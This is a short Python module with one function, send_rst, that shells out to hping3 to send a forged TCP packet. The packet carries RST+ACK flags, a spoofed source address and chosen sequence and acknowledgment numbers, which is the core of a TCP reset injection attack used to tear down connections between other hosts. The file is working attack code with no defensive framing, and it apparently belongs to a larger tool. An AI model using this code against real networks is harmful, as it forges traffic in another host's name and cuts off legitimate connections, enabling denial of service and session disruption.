import subprocess

from util import log


def send_rst(source_ip, source_port, destination_ip, destination_port, seq, ack):
    log(
        "RST",
        f"{source_ip}:{source_port} -> {destination_ip}:{destination_port}  "
        f"seq={seq} ack={ack}  flags=RST+ACK",
    )

    command = [
        "hping3",
        "--count",
        "1",
        "-a",
        source_ip,
        "--baseport",
        str(source_port),
        "--destport",
        str(destination_port),
        "--setseq",
        str(seq),
        "--setack",
        str(ack),
        "--rst",
        "--ack",
        destination_ip,
    ]
    log("RST", "exec: " + " ".join(command))

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=False)
    except FileNotFoundError:
        log("RST", "hping3 not found (sudo apt install hping3)")
        return

    if result.stdout:
        log("RST", f"stdout:\n{result.stdout}")
    if result.stderr:
        log("RST", f"stderr:\n{result.stderr}")
    log("RST", f"exit code = {result.returncode}")
